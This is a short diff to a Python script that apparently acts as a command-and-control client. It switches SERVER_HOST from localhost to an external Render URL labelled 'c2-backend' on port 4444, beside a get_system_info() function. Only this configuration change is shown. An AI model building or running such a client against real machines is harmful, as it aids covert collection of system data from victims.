@@ -7,7 +7,7 @@ import time
 import netifaces
 
 # Server settings
-SERVER_HOST = "127.0.0.1"  # Update to your server IP (e.g., Render URL if deployed)
+SERVER_HOST = "https://c2-backend-wily.onrender.com"  # Update to your server IP (e.g., Render URL if deployed)
 SERVER_PORT = 4444
 
 def get_system_info():
